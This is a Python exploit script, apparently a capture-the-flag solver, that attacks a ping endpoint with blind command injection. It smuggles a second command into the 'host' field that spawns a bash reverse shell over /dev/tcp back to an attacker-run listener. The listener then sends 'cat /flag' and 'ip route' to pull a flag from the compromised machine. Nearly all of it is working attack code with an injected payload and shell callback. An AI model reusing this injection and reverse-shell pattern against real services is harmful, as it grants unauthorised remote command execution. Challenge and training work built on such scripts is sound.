#!/usr/bin/env python3

import os
import re
import socket
import sys
import threading
import time

import httpx

FLAG_RE = re.compile(rb"FLAG\{[^\n\r}]*\}")


def _guess_callback_ip(target_host: str, target_port: int) -> str:
    def local_ip_to(host: str, port: int) -> str:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            sock.connect((host, port))
            return sock.getsockname()[0]
        finally:
            sock.close()

    try:
        target_ip = socket.gethostbyname(target_host)
    except socket.gaierror:
        target_ip = target_host

    ip = local_ip_to(target_ip, target_port)
    if ip.startswith("127."):
        ip2 = local_ip_to("1.1.1.1", 53)
        if not ip2.startswith("127."):
            ip = ip2
    return ip


def _recv_some(sock: socket.socket, timeout_s: float = 0.75) -> bytes:
    sock.settimeout(timeout_s)
    try:
        return sock.recv(65536)
    except socket.timeout:
        return b""


def _env(name: str) -> str:
    value = os.environ.get(name)
    if not value:
        raise RuntimeError(f"missing env {name}")
    return value


class ListenerThread(threading.Thread):
    def __init__(self, listener: socket.socket, timeout_s: float = 8.0) -> None:
        super().__init__()
        self._listener = listener
        self._timeout_s = timeout_s
        self.exit_code = 1

    def run(self) -> None:
        self._listener.settimeout(self._timeout_s)
        try:
            conn, _addr = self._listener.accept()
        except OSError:
            return
        except socket.timeout:
            print(
                "[!] reverse shell did not connect back (is the attacker reachable?)",
                file=sys.stderr,
            )
            return
        finally:
            self._listener.close()

        transcript = b""
        try:
            transcript += _recv_some(conn)
            conn.sendall(b"ip route\n")
            conn.sendall(b"cat /flag\n")
            time.sleep(0.2)
            for _ in range(20):
                transcript += _recv_some(conn)
                m = FLAG_RE.search(transcript)
                if m:
                    sys.stdout.buffer.write(m.group(0) + b"\n")
                    self.exit_code = 0
                    return
                time.sleep(0.1)
        finally:
            try:
                conn.sendall(b"exit\n")
            except Exception:
                pass
            conn.close()

        sys.stdout.buffer.write(transcript + (b"\n" if not transcript.endswith(b"\n") else b""))

    def stop(self) -> None:
        try:
            self._listener.close()
        except Exception:
            pass


def start_listener(timeout_s: float = 8.0) -> tuple[int, ListenerThread]:
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind(("0.0.0.0", 0))
    listener.listen(1)
    callback_port = listener.getsockname()[1]
    thread = ListenerThread(listener, timeout_s)
    thread.start()
    return callback_port, thread


def main() -> int:
    try:
        if len(sys.argv) == 4:
            target_host = sys.argv[1]
            target_port = int(sys.argv[2])
            _team_id = sys.argv[3]  # not required for this challenge
        else:
            target_host = _env("TARGET_HOST")
            target_port = int(_env("TARGET_PORT"))
            _team_id = _env("TARGET_TEAM_ID")  # not required for this challenge
    except Exception as exc:
        print(f"[!] {exc}", file=sys.stderr)
        print(
            f"Usage: {sys.argv[0]} <TARGET_HOST> <TARGET_PORT> <TARGET_TEAM_ID>",
            file=sys.stderr,
        )
        print(f"sys.argv={sys.argv!r}", file=sys.stderr)
        return 2

    callback_ip = _guess_callback_ip(target_host, target_port)

    callback_port, listener_thread = start_listener()
    print(callback_ip, callback_port)

    # Blind command injection -> spawn a reverse shell back to the attacker.
    # In common setups the exploit runs with --network host; the target container can reach the host via its
    # default gateway (ip route "default via ..."). Fall back to callback_ip if no gateway is present.
    payload = (
        "127.0.0.1;"
        "nohup bash -c '"
        'H=$(ip route 2>/dev/null | awk "/default/ {print \\$3; exit}"); '
        f'[ -z "$H" ] && H={callback_ip}; '
        f"bash -i >& /dev/tcp/$H/{callback_port} 0>&1"
        "' "
        "> /dev/null 2>&1 & #"
    )

    base = f"http://{target_host}:{target_port}"
    try:
        with httpx.Client(timeout=5.0) as client:
            client.post(f"{base}/api/ping", json={"host": payload})
    except Exception as exc:
        print(f"[!] exploit request failed: {exc}", file=sys.stderr)
        listener_thread.stop()
        return 1

    listener_thread.join()
    return listener_thread.exit_code


if __name__ == "__main__":
    raise SystemExit(main())
